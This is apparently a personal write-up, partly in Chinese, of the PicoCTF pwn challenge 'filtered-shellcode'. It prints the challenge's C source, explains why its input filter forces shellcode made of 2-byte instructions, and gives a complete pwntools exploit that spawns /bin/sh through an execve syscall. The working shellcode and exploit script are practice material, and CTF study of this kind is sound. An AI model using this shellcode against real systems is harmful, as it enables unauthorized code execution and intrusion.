---
title: PicoCTF - filtered-shellcode
tags: [PicoCTF, CTF, PWN]

category: "Security/Practice/PicoCTF/PWN"
---

# PicoCTF - filtered-shellcode
## Background
Shell Code
Reverse
## Source code
:::spoiler Source Code Got From Server After Get Shell
```cpp!
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_LENGTH 1000

void execute(char *shellcode, size_t length) {
    if (!shellcode || !length) {
        exit(1);
    }
    size_t new_length = length * 2;
    char result[new_length + 1];

    int spot = 0;
    for (int i = 0; i < new_length; i++) {
        if ((i % 4) < 2) {
            result[i] = shellcode[spot++];
        } else {
            result[i] = '\x90';
        }
    }
    // result[new_length] = '\xcc';
    result[new_length] = '\xc3';

    // Execute code
    int (*code)() = (int(*)())result;
    code();
}

int main(int argc, char *argv[]) {
    setbuf(stdout, NULL);
    char buf[MAX_LENGTH];
    size_t length = 0;
    char c = '\0';

    printf("Give me code to run:\n");
    c = fgetc(stdin);
    while ((c != '\n') && (length < MAX_LENGTH)) {
        buf[length] = c;
        c = fgetc(stdin);
        length++;
    }
    if (length % 2) {
        buf[length] = '\x90';
        length++;
    }
    execute(buf, length);
    return 0;
}
```
:::
## Recon
這一題沒有很難，但我沒有解出來，主要是因為reverse看不懂，完了QAQ，IDA都亂翻，只能求助於[^pico_pwn_filtered_shellcode_wp]，其實很簡單，好像也沒有filter的成分在，如果限制只能用每次兩bytes寫shell code不算的話
1. 其實就兩個function，一個是main function，另外一個是execute function，execute function主要會每一個shell code中間插入兩個nop，然後用function pointer的方式執行，所以我們的目標是寫一個shell code script開server的shell
2. 重點是shell code的instruction只能用2 bytes的instruction，所以沒辦法用類似`mov eax, 0x6e69622f`的這種方式，會GG，原因出自於execute function的for loop，他會把我們寫的shell code用2 bytes的方式切開，然後中間塞兩個nop(也就是兩個\x90，也是兩個bytes)，所以這其實就是限制我們只能用2 bytes寫shell code
    ```cpp!
    if ((i % 4) < 2) {result[i] = shellcode[spot++];}
    else {result[i] = '\x90';}
    ```
4. 所以不能隨便用exploit db上找到的shell code複製貼上，或是用以下payload，必須要善用`shl`，只要shl 16次(也就是2 bytes)就可以同時方式0x6e69622f，效果和`mov eax, 0x6e69622f`一樣
    ```asm!
    payload = asm("""
        mov eax, 0x6e69622f
        push eax
        mov eax, 0x0068732f
        push eax
        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
        xor edx, edx
        mov eax, 0xb
        lea ebx, DWORD PTR [esp]
        int 0x80
    """)
    ```
## Exploit - Write Properly Shell Code
```python!
from pwn import *

r = process('./fun')
# r = remote('mercury.picoctf.net', 35338)
r.recvline()

payload = asm("""
    /*Put the syscall number of execve in eax*/
    xor eax, eax
    mov al, 0xb
    
    /*Put zero in ecx and edx*/
    xor ecx, ecx
    xor edx, edx
    
    /*Push "/sh\x00" on the stack*/
    xor ebx, ebx
    mov bl, 0x68
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    mov bh, 0x73
    mov bl, 0x2f
    push ebx
    nop
    
    /*Push "/bin" on the stack*/
    mov bh, 0x6e
    mov bl, 0x69
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    shl ebx
    mov bh, 0x62
    mov bl, 0x2f
    push ebx
    nop
              
    /*Move the esp (that points to "/bin/sh\x00") in ebx*/
    mov ebx, esp/*Syscall*/
    int 0x80
""")
r.sendline(payload)

r.interactive()
```
## Reference
[^pico_pwn_filtered_shellcode_wp]:[PicoCTF - Filtered Shellcode [Pwn]](https://cyb3rwhitesnake.medium.com/picoctf-filtered-shellcode-pwn-3d69010376df)